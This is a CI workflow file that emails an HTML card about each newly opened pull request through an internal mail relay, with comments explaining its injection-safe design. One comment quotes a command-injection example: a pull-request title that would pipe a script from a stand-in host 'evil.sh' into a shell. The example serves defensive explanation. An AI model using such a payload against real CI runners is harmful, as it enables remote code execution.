---
name: PR Notification

# Emails an HTML card to alerts@ when a pull request is opened, so a PR that lands
# while nobody is watching Gitea still surfaces. Ported from homelab-gitops
# .gitea/workflows/pr-notify.yml — same mail-relay endpoint, same card markup, same
# `🔀 PR #<N>: <title>` subject, so both repos render identically in the inbox.
#
# Deliberately has NO checkout step. Everything it needs comes from the
# `github.event` context, so this `pull_request`-triggered job never executes
# PR-branch code — unlike the ci-notify.sh steps elsewhere, which run the untrusted
# PR-branch copy of that script and therefore have to scrub secrets from their env
# first (see the "Notify on failure" step in ai-pr-review.yml). Keep it that way: if
# this ever needs repo files, checkout the BASE ref, not the PR head.
#
# PR-controlled values are passed via `env:`, never interpolated into `run:` with
# `${{ }}` — a PR titled `"; curl evil.sh | sh; #` would otherwise execute on the
# runner. They are then HTML-escaped with jq's `@html` before going into the card,
# so a title containing markup renders as text instead of live HTML in the reader's
# mail client. (This escaping is the one deviation from the homelab original.)
#
# Not a required status check — branch protection ticks contexts explicitly, and a
# notifier must never be able to block a merge. See docs/ci-branch-protection.md.
#
# The relay (homelab-gitops services/mail-relay) owns delivery — retry + on-disk
# spool — so a mail-server blip queues the mail instead of dropping it. Failure to
# notify is never worth failing the job, hence the trailing `|| true`.
on:
  pull_request:
    types: [opened]

concurrency:
  group: pr-notify-${{ github.event.pull_request.number }}
  cancel-in-progress: false

jobs:
  notify:
    name: Notify on new PR
    runs-on: ubuntu-latest
    steps:
      - name: Send PR email
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_URL: ${{ github.event.pull_request.html_url }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
          BASE_BRANCH: ${{ github.event.pull_request.base.ref }}
          HEAD_BRANCH: ${{ github.event.pull_request.head.ref }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail

          # HTML-escape a PR-controlled value for interpolation into the card below.
          esc() { jq -rn --arg v "$1" '$v | @html'; }
          e_title=$(esc "$PR_TITLE")
          e_author=$(esc "$PR_AUTHOR")
          e_head=$(esc "$HEAD_BRANCH")
          e_base=$(esc "$BASE_BRANCH")
          e_url=$(esc "$PR_URL")

          style='body{margin:0;padding:24px 16px;background:#f1f5f9;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;}.card{max-width:600px;margin:0 auto;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);}.hdr{padding:26px 30px;background:#3b82f6;color:#fff;}.badge{display:inline-block;font-size:13px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;background:rgba(255,255,255,.2);border-radius:5px;padding:3px 11px;margin-bottom:12px;}.title{font-size:26px;font-weight:700;line-height:1.2;margin-bottom:6px;}.sub{font-size:15px;opacity:.85;}.body{padding:26px 30px;}.sec{font-size:12px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#94a3b8;margin-bottom:10px;padding-bottom:5px;border-bottom:1px solid #f1f5f9;}.tbl{width:100%;border-collapse:collapse;font-size:14px;margin-bottom:24px;}.tbl td{padding:7px 10px;vertical-align:top;border-bottom:1px solid #f8fafc;}.tbl td.k{color:#64748b;white-space:nowrap;}.tbl td.v{color:#1e293b;word-break:break-all;}.tbl tr:last-child td{border-bottom:none;}.btn{display:inline-block;padding:12px 26px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;font-size:15px;font-weight:600;}.footer{padding:14px 30px;background:#f8fafc;border-top:1px solid #e2e8f0;font-size:13px;color:#94a3b8;text-align:center;}'

          html='<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><style>'"${style}"'</style></head><body>'
          html+='<div class="card"><div class="hdr"><div class="badge">🔀 pull request</div>'
          html+='<div class="title">PR #'"${PR_NUMBER}"': '"${e_title}"'</div>'
          html+='<div class="sub">📦 '"${REPO}"'</div></div>'
          html+='<div class="body"><div class="sec">🏷️ Details</div><table class="tbl">'
          html+='<tr><td class="k">repository</td><td class="v">'"${REPO}"'</td></tr>'
          html+='<tr><td class="k">author</td><td class="v">'"${e_author}"'</td></tr>'
          html+='<tr><td class="k">from branch</td><td class="v">'"${e_head}"'</td></tr>'
          html+='<tr><td class="k">into</td><td class="v">'"${e_base}"'</td></tr>'
          html+='</table><a href="'"${e_url}"'" class="btn">🔗 View Pull Request</a>'
          html+='</div><div class="footer">🔔 Sent by Gitea CI</div></div></body></html>'

          # Send via the mail-relay (retry + spool); From=ci is allowlisted.
          jq -nc --arg s "🔀 PR #${PR_NUMBER}: ${PR_TITLE}" --arg h "$html" \
            '{from:"ci", name:"CI", subject:$s, html:$h}' \
          | curl -sf -X POST "${MAIL_RELAY:-http://mail-relay.mail.svc.cluster.local/send}" \
              -H 'Content-Type: application/json' --data-binary @- \
              --connect-timeout 10 --retry 6 --retry-delay 10 --retry-connrefused --retry-all-errors \
              >/dev/null || echo "pr-notify: relay POST failed (curl exit $?)"
